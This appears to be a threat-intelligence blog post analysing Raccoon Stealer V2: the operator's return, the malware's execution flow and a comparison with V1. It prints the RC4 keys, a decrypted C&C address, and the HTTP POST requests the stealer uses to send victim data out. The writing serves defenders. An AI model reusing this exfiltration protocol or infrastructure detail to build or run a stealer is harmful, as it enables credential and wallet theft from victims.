id="3fcb" class="mw mx gu my b mz pp nb nc nd pq nf ng nh pr nj nk nl ps nn no np pt nr ns nt pu pv pw bk">On March 25, 2022, the operator of Raccoon Stealer, who was active on the dark web forum, temporarily suspended his activities since a key developer died in the Russia-Ukraine War.</li><li id="2a09" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">On May 17, 2022, the operator mentioned that the development of a new version of the stealer was completed, and uploaded details of changes, improvements, and prices to their Telegram channel.</li><li id="d49c" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">On June 9, 2022, the operator resumed activities on the dark web forum where they were active and wrote a comment asking for inquiries about <strong class="my gv">Raccoon Stealer V2</strong> to contact via Telegram.</li><li id="f560" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">During deep &amp; dark web monitoring, we confirmed that the Stealer log file, which is generated by <strong class="my gv">Raccoon Stealer V2</strong>, has already begun to be traded and shared among cybercriminals.</li><li id="bcee" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">From what has been confirmed so far, it is estimated that attacks using <strong class="my gv">V2</strong> started in earnest in June after the testing period.</li><li id="9d8f" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">As a result of obtaining and analyzing the Raccoon Stealer <strong class="my gv">V2</strong> sample, it was confirmed that there were no significant differences in the overall execution flow although many parts were changed.</li><li id="585d" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">It is judged that <strong class="my gv">V2</strong> will be continuously updated in the future in that there are unfinished codes compared to V1 and functions such as analysis interruption.</li><li id="6415" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">Currently, it is distributed in the same way as V1, disguised as Cracked Software, but as it is updated to <strong class="my gv">V2</strong>, continuous monitoring is required to see if there is any change in the distribution method in the future.</li></ul><h1 id="ab21" class="or os gu bf ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn po bk">Raccoon Stealer Resumes Activity</h1><p id="2452" class="pw-post-body-paragraph mw mx gu my b mz pp nb nc nd pq nf ng nh pr nj nk nl ps nn no np pt nr ns nt gn bk">The operator of Raccoon Stealer, who has been active on the dark web forum “Exploit”, commented saying that the operation was temporarily suspended on his promotional post on March 25th. The “special operation” that the operator referred to in the text was known as the Russia-Ukraine War, which killed one of the key developers of the Raccoon Stealer project, making the project no longer stable.</p><p id="8131" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In a later post, the operator promised that they weren’t going out of business forever and that they would return in a few months to work on a second version. mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">1. String decryption</p><p id="7b38" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">As in V1, the string required for malicious behavior is extracted using Base64 and RC4 algorithms. The RC4 Key used at this time is fixed as “edinayarossiya”.</p><ul class=""><li id="d7ac" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Encrypted String: “VVsEvhkqyZGsN0Qv”</li><li id="5fbb" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">RC4 Key: “edinayarossiya”</li><li id="210d" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">Decrypted String: “\cookies.txt”</li></ul><p id="0dec" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">2. Extract the C&amp;C server address</p><p id="4e32" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Raccoon Stealer V2 can contain up to 5 C&amp;C server addresses, which are encrypted and hard-coded with spaces in the Raccoon Stealer. Before decrypting the C&amp;C server, all spaces are removed and extracted in the same way as in <em class="nx">1. String Decryption</em>. For the RC4 Key used at this time, a key different from that of other string decryption is used.</p><ul class=""><li id="5d6d" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Encrypted String: “lIdAg3LYd/akTgV0hVwlNF5b “</li><li id="71a2" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">RC4 Key: “403f7b121a3afd9e8d27f945140b8a92”</li><li id="5c6b" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">Decrypted String: “http://2.58.56.247”</li></ul><p id="6f7e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">3. Check the country of the infected device</p><p id="42f2" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">It collects the “Locale Name” of the infected device through GetUserDefaultLocaleName function and checks whether the string “ru” is included, but after checking, no other action is implemented yet.</p><p id="5d75" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">4. Create a mutex</p><p id="7df5" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Duplicate execution is prevented through mutex. To prevent the malware to be started twice, the process executed later is terminated.</p><p id="2a18" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">5. Check permission</p><p id="13e6" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Checks whether the current process is running with “Local System” privileges. In V1, when running with Local System privileges, the token of explorer.exe was duplicated and executed with the privileges, but in V2, this function is not yet fully implemented.</p><p id="79ba" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">6. Send basic information about the infected devices</p><p id="f35a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The basic information about the infected device is collected and sent first. At this time, the information includes the “MachineGuid” and “Username” used to identify the infected device.</p><pre class="ob oc od oe of rl rm rn ro ay rp bk"><span id="dd92" class="qh os gu rm b io rq rr l jd rs">POST / HTTP/1.1<br/>Accept: */*<br/>Content-Type: application/x-www-form-urlencoded; charset=utf-8<br/>User-Agent: record</span><span id="4965" class="qh os gu rm b io rt rr l jd rs">machineId=[MachineGuid]|[Username]&amp;configId=[RC4 Key used in <em class="nx">2. Extract C&amp;C server address</em>]</span></pre><p id="62e0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">7. Receive configuration information from C&amp;C</p><p id="2e89" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">When the basic information about the infected device is sent, the configuration information necessary for malicious behavior is received from the C&amp;C Server. The entire configuration information is as follows, and it has been changed from the JSON format in V1 to the custom format now. This information includes various fields such as library file name and download address, target wallet software, log file name, and target local file.</p><ul class=""><li id="0afd" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Data format in configuration information: [Field]_[Filename]:[Detailed Information]</li></ul><pre class="ob oc od oe of rl Add environment variable</p><p id="970e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Add the specific path included within the Raccoon Stealer to the environment variable, as well as the working path specified in <em class="nx">8. Set working path and download library.</em></p><ul class=""><li id="234e" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">C:\Windows\system32;</li><li id="e9a2" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">C:\Windows;</li><li id="ce59" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">C:\Windows\System32\Wbem;</li><li id="8ac1" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">C:\Windows\System32\WindowsPowerShell\\v1.0\\;</li><li id="be2d" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">C:\Users\[Username]\AppData\LocalLow;</li><li id="112c" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">[Working Path]</li></ul><p id="a5e1" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">10. Send detailed information about the infected device</p><p id="bfa9" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The detailed information about the infected device is sent to the C&amp;C server by referring to the <strong class="my gv">sstmnfo_</strong> field in the configuration information. The information collected and sent is as follows, and if it is successfully sent, a “receive” message is received from the server. In V1, a file containing the information is created on the infected device, but in V2, the information is sent directly to the C&amp;C server without creating a file.</p><pre class="ob oc od oe of rl rm rn ro ay rp bk"><span id="a3a4" class="qh os gu rm b io rq rr l jd rs">POST /[token] HTTP/1.1<br/>Accept: */*<br/>Content-Type: multipart/form-data; boundary=[Random 16byte String]<br/>User-Agent: record<br/>Host: 2.58.56.247<br/>Content-Length: 6854<br/>Connection: Keep-Alive<br/>Cache-Control: no-cache</span><span id="6f7a" class="qh os gu rm b io rt rr l jd rs">–[Random 16byte String]<br/>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;System Info.txt&quot;<br/>Content-Type: application/x-object</span><span id="6c44" class="qh os gu rm b io rt rr l jd rs">System Information:<br/>     - Locale: Korean<br/>     - Time zone: +540 minutes from GMT<br/>     - OS: Windows 10 Enterprise N<br/>     - Architecture: x64<br/>     - CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GH (4 cores)<br/>     - RAM: 8191 MB<br/>     - Display size: 2560x1331<br/>     - Display Devices:<br/>             0) VMware SVGA 3D</span><span id="c371" class="qh os gu rm b io rt rr l jd rs">Installed applications:<br/>     [Application List]</span><span id="91af" class="qh os gu rm b io rt rr l jd rs">--[Random 16byte String]--</span></pre><p id="46ef" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">11. Exfiltrate stolen data from the infected device</p><p id="147a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Search and steal the target information and files to be collected by referring to the configuration information received in <em class="nx">7. Receive configuration information from C&amp;C</em>. The target information is as follows.</p><ul class=""><li id="b73e" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Data stored in the browser: nh ni nj nk nl nm nn no np nq nr ns nt gn bk">12. Support for executing additional commands and downloading additional malware</p><p id="5426" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">If the <strong class="my gv">ldr</strong> field exists in the configuration information, additional commands or processes are executed, or additional malware is downloaded and executed.</p><h1 id="3eb0" class="or os gu bf ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn po bk">Compare Raccoon Stealer V1 and V2</h1><h2 id="7297" class="qh os gu bf ot qi qj dy ox qk ql ea pb nh qm qn qo nl qp qq qr np qs qt qu qv bk"><strong class="al">Commonality</strong></h2><p id="64a6" class="pw-post-body-paragraph mw mx gu my b mz pp nb nc nd pq nf ng nh pr nj nk nl ps nn no np pt nr ns nt gn bk">1. Same packer</p><p id="0805" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Both Raccoon Stealer V1 and V2 use the same packer. This packer was used not only in Raccoon Stealer, but also in Vidar, KPot, and other stealers. The characteristic of this packer is that it is difficult to know which malware is included by creating a binary that wraps the internal malware, and it is very difficult to create an automated unpacker tool.</p><figure class="ob oc od oe of og ny nz paragraph-image"><div role="button" tabindex="0" class="oh oi fj oj bh ok"><div class="ny nz qe"><picture><source ni nj nk nl nm nn no np nq nr ns nt gn bk">3. Working path</p><p id="56f2" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The working path used for library download and storage is also used in V2.</p><ul class=""><li id="b1fd" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Working path: %USERPROFILE%\AppData\LocalLow</li></ul><h2 id="0bcb" class="qh os gu bf ot qi qj dy ox qk ql ea pb nh qm qn qo nl qp qq qr np qs qt qu qv bk"><strong class="al">Difference</strong></h2><p id="f413" class="pw-post-body-paragraph mw mx gu my b mz pp nb nc nd pq nf ng nh pr nj nk nl ps nn no np pt nr ns nt gn bk">1. Query format</p><p id="1e3b" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Raccoon Stealer sends the <em class="nx">MachineGuid</em> value and <em class="nx">username</em> of the infected device before sending detailed information and stolen data. While the <em class="nx">Token</em> value is encrypted in the Raccoon Stealer V1, it is hard-coded in plaintext in the Raccoon Stealer V2. In addition, this value is used as the RC4 Key value for decrypting the C&amp;C server in the Raccoon Stealer V2.</p><ul class=""><li id="6ecc" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Query format in V1</li></ul><p id="3970" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">— <strong class="my gv">b</strong>=[MachineGuid]<strong class="my gv">_</strong>[Username]&amp;<strong class="my gv">c</strong>=[Token]<strong class="my gv">&amp;f=json</strong></p><ul class=""><li id="2840" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pu pv pw bk">Query format in V2</li></ul><p id="610b" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">— <strong class="my gv">machineId</strong>=[MachineGuid]<strong class="my gv">|</strong>[Username]&amp;<strong class="my gv">configId</strong>=[Token]</p><p id="978d" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">2. Configuration information format</p><p id="9b71" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Raccoon Stealer receives the configuration information necessary for malicious behavior from the C&amp;C server, and the format of the configuration information was changed in V2. In V1, JSON format was used, but in V2 uses a custom format using “:”, “;”.</p><figure class="ob oc od oe of og ny nz paragraph-image"><div role="button" tabindex="0" class="oh oi fj oj bh ok"><div nh ni nj nk nl nm nn no np nq nr ns nt gn bk">3. How to send stolen data</p><p id="adaf" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In V1, after creating a log file in the working path, the directory is compressed and sent to the C&amp;C server. However, in V2, it is no longer created as a file and immediately sent to the C&amp;C server.</p><p id="05fb" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">4. How to get the C&amp;C server address</p><p id="adf0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In V1, Google Drive and Telegram channels were used as a channel to obtain the C&amp;C server address dynamically, but in V2, this feature has not yet been confirmed and the C&amp;C server address is hard-coded in the stealer.</p><h1 id="7847" class="or os gu bf ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn po bk">Conclusion</h1><ul class=""><li id="a2a1" class="mw mx gu my b mz pp nb nc nd pq nf ng nh pr nj nk nl ps nn no np pt nr ns nt pu pv pw bk">As a result of the analysis, it has been confirmed that this malware is the V2 version of the Raccoon Stealer, and it is clear that Raccoon Stealer has resumed its operation in that Stealer logs are already being traded and shared among cybercriminals.</li><li id="9085" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">As the Raccoon Stealer operator becomes active again, there is a possibility that existing users will return to Raccoon Stealer, so it is necessary to prepare for Raccoon Stealer V2.</li><li id="f7cb" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">It is judged that V2 will be continuously updated in the future in that there are still unfinished codes and features compared to V1.</li><li id="d8a3" class="mw mx gu my b mz px nb nc nd py nf ng nh pz nj nk nl qa nn no np qb nr ns nt pu pv pw bk">Currently, it is distributed in the same way as V1, disguised as Cracked Software, but as it is updated to V2, continuous monitoring is required to see if there is any change in the distribution method in the future</li></ul><h1
